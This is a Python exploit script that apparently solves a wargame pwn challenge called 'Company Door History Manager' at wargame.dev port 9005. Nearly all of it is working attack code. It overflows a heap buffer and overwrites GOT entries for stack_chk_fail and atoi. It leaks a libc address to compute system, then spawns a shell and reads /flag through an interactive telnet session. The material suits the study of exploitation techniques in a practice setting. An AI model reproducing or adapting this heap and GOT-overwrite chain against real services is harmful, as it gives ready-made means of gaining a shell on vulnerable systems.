from socket import *
from struct import *
import telnetlib
import os


PQ = lambda x: pack('<Q', x)

def rd(t):
    r = ''
    while t not in r:
        c = s.recv(1)
        if not c:
            break

        r += c

    return r


def go_to_work(name, department):
    s.send('0\n')
    rd('> ')
    s.send('attach\n')
    rd('> ')
    s.send('%s\n' % name)
    rd('> ')
    s.send('%s\n' % department)
    return rd('> ')

def leave_office(name, department):
    s.send('1\n')
    rd('> ')
    s.send('attach\n')
    rd('> ')
    s.send('%s\n' % name)
    rd('> ')
    s.send('%s\n' % department)

    return rd('> ')

def change_department(option, index, department):
    s.send('2\n')
    rd('> ')
    s.send('%s\n' % option)
    rd('> ')
    s.send('%d\n' % index)
    rd('> ')
    s.send('%s\n' % department)
    return rd('> ')

def show_history(name, department):
    s.send('3\n')
    rd('> ')
    s.send('%s\n' % name)
    rd('> ')
    s.send('%s\n' % department)

    data = rd('[ Company Door History Manager ]')
    data += rd('> ')
    return data


converter_template_code = """
#include <time.h>

int main() {
    struct tm t;
    t.tm_year = %d - 1900;
    t.tm_sec = %d;
    t.tm_min = %d;
    t.tm_hour = %d;
    t.tm_mday = %d;
    t.tm_mon = %d;
    
"""

end_code = """ 
    printf("%p\\n", mktime(&t));
    return 0;
}
"""

months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']

def convert_time(string):
    i = 0
    string = string[4:]
    mon = int(months.index(string.split(' ')[0]))
    mday = string.split(' ')[1]
    if not mday:
        i += 1
        mday = int(string.split(' ')[1+i])
    else:
        mday = int(mday)
    hour = int(string.split(' ')[2+i].split(':')[0])
    min = int(string.split(':')[1])
    sec = int(string.split(':')[2].split(' ')[0])
    year = int(string.split(' ')[3+i])

    print year, sec, min, hour, mday, mon
    code = converter_template_code % (year, sec, min, hour, mday, mon)
    with open('temp.c', 'w') as f:
        f.write(code + end_code)
    os.system('gcc -o temp temp.c')
    fd = os.popen('./temp')
    return fd.read()

while True:
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('wargame.dev', 9005))


    rd('> ')
    show_history('a'*0x10, 'b'*0x808) #allocate buffer heap. There is a remain pointer after switch buffer...
    for i in range(4):
        go_to_work('grigoritchy', 'a'*0x200)

    go_to_work('grigoritchy', 'x'*0x880)

    atoi_got = 0x6040a0
    stack_chk_fail_got = 0x604038
    stack_chk_fail_plt = 0x400936
    libc_start_main_code = PQ(0x4855544155415641) + PQ(0x0090ec814853cd89)
    data = 'a'*0x940
    data += 'x'*0x20 #name
    data += 'x'*8 # department_length
    data += '\xa0\xa0' # 8 bit bruteforce needed, entrance record list
    show_history('grigoritchy', data) # overwrite

    change_department('entrance', 4, PQ(stack_chk_fail_got)[:4])
    data = show_history(PQ(stack_chk_fail_plt), libc_start_main_code)
    try:
        time_data = data.split('0. time> ')[1].split('\n')[0]
    except:
        print 'brute force failed. try again'
        continue

    print time_data
    libc_strcmp = int(convert_time(time_data),16)
    libc_base = libc_strcmp - 0x976e0
    libc_system = libc_base + 0x45390
    print 'libc_strcmp', hex(libc_strcmp)
    print 'libc_base', hex(libc_base)


    data = 'a' * 0x940
    data += 'x' * 0x20  # name
    data += 'x' * 8  # department_length
    data += PQ(atoi_got) # 3byte heap address needed
    print show_history('grigoritchy', data)  # overwrite
    change_department('entrance', 4, PQ(libc_system)[:6])

    s.send('sh\n')
    s.send('cat /flag\n')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
